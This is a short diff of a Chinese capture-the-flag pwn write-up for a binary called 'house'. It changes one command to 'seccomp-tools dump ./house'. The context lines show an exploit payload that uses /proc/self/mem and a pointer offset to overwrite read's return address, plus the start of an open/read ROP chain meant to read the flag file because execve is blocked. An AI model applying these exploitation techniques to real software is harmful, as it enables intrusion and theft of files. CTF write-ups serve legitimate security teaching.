@@ -2878,7 +2878,7 @@ buf_addr+24           --> void *v8(写入指针)
 payload = b'/proc/self/mem'
 payload = payload.ljust(24, b'\x00') + p64(buf_addr - 0x38)
 ```
-这样再程序调用read(0, v8, 0x200)时就可以覆盖从read返回地址及其以下的内容了。这里存在一个坑，使用seccomp-tools ./house查看发现execve系统调用被禁用了，意味着无法执行/bin/sh获取shell，只能通过构造打开文件，读文件的方式获取flag了，rop链如下
+这样再程序调用read(0, v8, 0x200)时就可以覆盖从read返回地址及其以下的内容了。这里存在一个坑，使用seccomp-tools dump ./house查看发现execve系统调用被禁用了，意味着无法执行/bin/sh获取shell，只能通过构造打开文件，读文件的方式获取flag了，rop链如下
 ```python
 # open('/home/ctf/flag', 0)
 read_ret_addr  -->pop_rdi
